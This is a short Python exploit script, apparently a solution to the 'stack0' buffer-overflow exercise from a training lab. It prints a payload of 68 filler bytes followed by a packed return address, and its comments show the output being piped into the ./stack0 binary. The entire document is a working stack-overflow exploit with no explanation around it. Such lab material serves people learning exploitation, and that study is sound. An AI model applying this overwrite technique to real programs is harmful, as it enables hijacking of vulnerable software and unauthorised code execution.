# python stack0.py > stack0_exploit
# cat stack0_exploit - | ./stack0
import struct
payload  = 'A' * 68  #overflow buffer
payload += struct.pack("<I",0x00008420)
print(payload)
